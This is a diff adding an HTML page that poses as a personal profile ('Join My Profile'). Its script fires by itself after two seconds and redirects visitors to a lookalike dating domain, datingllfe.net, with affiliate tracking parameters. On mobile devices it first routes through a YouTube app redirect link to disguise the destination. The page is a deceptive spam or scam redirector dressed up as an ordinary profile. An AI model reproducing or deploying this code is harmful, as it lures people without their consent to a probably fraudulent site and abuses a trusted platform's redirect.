@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Join My Profile</title>
+
+</head>
+
+<body>
+  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
+  <button onclick="myFunction()">View my profile</button>
+<script>
+    setTimeout(function() {
+      myFunction();
+    }, 2000);
+    
+    function myFunction() {
+      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbS1CWmJ4VzVMTFhXVGZ4YjdrWF9fWnZRaUpMZ3xBQ3Jtc0tsckVET0wzOVdSZnVRZUMtZndqM2JKZk9pLXc1ZTE3NW93cmp2UURNZ3RGdjNESGdaV0thQ2V2UzVPcW40S28zV3V1cFFmSGJsYlZoUUhwX3Boa2NMcjRTMHpGVEFUcERjdzNfbUh1dmFTbVAwTzl4Zw&q=https%3A%2F%2Fdgmvbk.datingllfe.net%2F%3Futm_source%3Dda57dc555e50572d%26s1%3D168480%26s2%3D1527353%26s3%3DUk%26click_id%3Dlive_love%26j5%3D1%26j6%3D1&html_redirect=1";
+      
+      var fallback = "https://dgmvbk.datingllfe.net?utm_source=da57dc555e50572d&s1=168480&s2=1527353&s3=Uk&click_id=live_love&j5=1&j6=1";
+
+      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+          window.location = app;
+          window.setTimeout(function() {
+              window.location = fallback;
+          }, 25);
+      } else {
+          window.location = fallback;
+      }
+
+      function killPopup() {
+          window.removeEventListener('pagehide', killPopup);
+      }
+
+      window.addEventListener('pagehide', killPopup);
+    }
+</script>
+</body>
+</html>
